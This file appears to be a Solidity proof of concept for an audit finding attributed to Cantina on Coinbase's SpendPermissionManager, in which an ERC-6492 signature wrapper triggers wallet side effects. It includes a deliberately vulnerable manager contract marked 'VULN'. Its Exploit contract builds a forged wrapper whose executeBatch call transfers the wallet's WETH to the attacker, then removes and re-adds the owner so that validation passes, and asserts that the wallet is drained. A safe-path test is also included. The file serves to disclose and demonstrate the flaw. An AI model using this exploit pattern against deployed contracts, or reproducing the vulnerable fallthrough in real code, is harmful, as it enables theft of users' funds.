// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Coinbase SpendPermissionManager — ERC-6492 side effects (Cantina, 2024-10).
    approveWithSignature accepts a 0x6492 wrapper. The owner signature is
    valid for owner index 0. The caller rewrites the index to nextOwnerIndex
    so the first check fails, then the checker calls the wallet with
    executeBatch: send the 10 WETH, remove owner 0, add the owner at index 2.
    The second check now passes and the wallet balance is 0.
    A wrapper that keeps owner index 0 passes the first check and does not call executeBatch. */

contract WETH {
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SmartWallet {
    struct Call {
        address target;
        uint256 value;
        bytes data;
    }

    mapping(uint256 => bytes) public owners;
    uint256 public nextOwnerIndex;
    bytes4 public constant MAGIC1271 = 0x1626ba7e;

    constructor(address eoa, address manager) {
        owners[0] = abi.encode(eoa);
        owners[1] = abi.encode(manager);
        nextOwnerIndex = 2;
    }

    function isOwnerAddress(address account) public view returns (bool) {
        for (uint256 i; i < nextOwnerIndex; i++) {
            if (owners[i].length >= 32 && abi.decode(owners[i], (address)) == account) return true;
        }
        return false;
    }

    function executeBatch(Call[] calldata calls) external {
        require(isOwnerAddress(msg.sender), "owner");
        for (uint256 i; i < calls.length; i++) {
            (bool ok,) = calls[i].target.call{value: calls[i].value}(calls[i].data);
            require(ok, "sub");
        }
    }

    function removeOwnerAtIndex(uint256 index, bytes calldata) external {
        require(msg.sender == address(this), "self");
        delete owners[index];
    }

    function addOwnerAddress(address owner) external {
        require(msg.sender == address(this), "self");
        owners[nextOwnerIndex] = abi.encode(owner);
        nextOwnerIndex += 1;
    }

    function isValidSignature(bytes32 hash, bytes calldata signature) external view returns (bytes4) {
        (uint256 ownerIndex, bytes memory sig) = abi.decode(signature, (uint256, bytes));
        if (owners[ownerIndex].length < 32 || sig.length != 65) return 0xffffffff;
        address owner = abi.decode(owners[ownerIndex], (address));
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        if (ecrecover(hash, v, r, s) == owner) return MAGIC1271;
        return 0xffffffff;
    }
}

contract SpendPermissionManager {
    bytes32 public constant ERC6492_MAGIC = 0x6492649264926492649264926492649264926492649264926492649264926492;
    SmartWallet public wallet;
    bool public approved;
    bool public sideEffectCalled;

    function setWallet(SmartWallet _wallet) external {
        wallet = _wallet;
    }

    function approveWithSignature(bytes32 hash, bytes calldata signature) external {
        require(isValidERC6492SignatureNowAllowSideEffects(address(wallet), hash, signature), "sig");
        approved = true;
    }

    function isValidERC6492SignatureNowAllowSideEffects(address signer, bytes32 hash, bytes calldata signature)
        public
        returns (bool)
    {
        if (signature.length < 32 || bytes32(signature[signature.length - 32:]) != ERC6492_MAGIC) {
            return _isValidNow(signer, hash, signature);
        }
        bytes memory core = signature[:signature.length - 32];
        (address prepareTo, bytes memory prepareData, bytes memory inner) = abi.decode(core, (address, bytes, bytes));
        if (signer.code.length == 0) {
            (bool deployed,) = prepareTo.call(prepareData);
            deployed;
        }
        if (_isValidNow(signer, hash, inner)) return true;
        // @> VULN: an invalid ownerIndex falls through to an arbitrary call on the wallet before the signature is checked again
        (bool ok,) = signer.call(prepareData);
        sideEffectCalled = ok;
        return _isValidNow(signer, hash, inner);
    }

    function _isValidNow(address signer, bytes32 hash, bytes memory signature) internal view returns (bool) {
        (bool ok, bytes memory ret) =
            signer.staticcall(abi.encodeWithSignature("isValidSignature(bytes32,bytes)", hash, signature));
        if (!ok || ret.length < 32) return false;
        bytes4 magic;
        assembly {
            magic := mload(add(ret, 32))
        }
        return magic == 0x1626ba7e;
    }
}

contract Exploit {
    address public constant OWNER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    bytes32 public constant PERM_HASH = keccak256(abi.encode(uint256(10 ether), keccak256("SPEND")));
    bytes public constant OWNER_SIG =
        hex"3105140677cc3999f76f7232d8ffb86eb144d87826b03022241651cce2732df11355391a33a28d87cfe4414e4552ee27290d01ce8e4ae9bf0fd4e2d804986a3b1b";

    WETH public weth;
    SpendPermissionManager public manager;
    SmartWallet public wallet;
    uint256 public drained;

    constructor() {
        weth = new WETH();
        manager = new SpendPermissionManager();
        wallet = new SmartWallet(OWNER, address(manager));
        manager.setWallet(wallet);
        weth.mint(address(wallet), 10 ether);
    }

    function run() external {
        bytes memory wrapped = abi.encode(uint256(2), OWNER_SIG);
        SmartWallet.Call[] memory calls = new SmartWallet.Call[](3);
        calls[0] = SmartWallet.Call(address(weth), 0, abi.encodeWithSignature("transfer(address,uint256)", address(this), 10 ether));
        calls[1] = SmartWallet.Call(
            address(wallet), 0, abi.encodeWithSignature("removeOwnerAtIndex(uint256,bytes)", uint256(0), abi.encode(OWNER))
        );
        calls[2] = SmartWallet.Call(address(wallet), 0, abi.encodeWithSignature("addOwnerAddress(address)", OWNER));
        bytes memory prepareData = abi.encodeWithSignature("executeBatch((address,uint256,bytes)[])", calls);
        bytes memory signature = abi.encodePacked(abi.encode(address(wallet), prepareData, wrapped), manager.ERC6492_MAGIC());
        manager.approveWithSignature(PERM_HASH, signature);
        drained = weth.balanceOf(address(this));
        require(manager.sideEffectCalled(), "called");
        require(manager.approved(), "approved");
        require(drained == 10 ether, "drained");
        require(weth.balanceOf(address(wallet)) == 0, "empty");
        require(wallet.owners(0).length == 0, "removed");
        require(abi.decode(wallet.owners(2), (address)) == OWNER, "readded");
    }

    function runSafe() external {
        bytes memory wrapped = abi.encode(uint256(0), OWNER_SIG);
        bytes memory prepareData = abi.encodeWithSignature("executeBatch((address,uint256,bytes)[])", new SmartWallet.Call[](0));
        bytes memory signature = abi.encodePacked(abi.encode(address(wallet), prepareData, wrapped), manager.ERC6492_MAGIC());
        manager.approveWithSignature(PERM_HASH, signature);
        require(manager.approved(), "approved");
        require(!manager.sideEffectCalled(), "no side effect");
        require(weth.balanceOf(address(wallet)) == 10 ether, "kept");
        require(weth.balanceOf(address(this)) == 0, "attacker");
    }
}
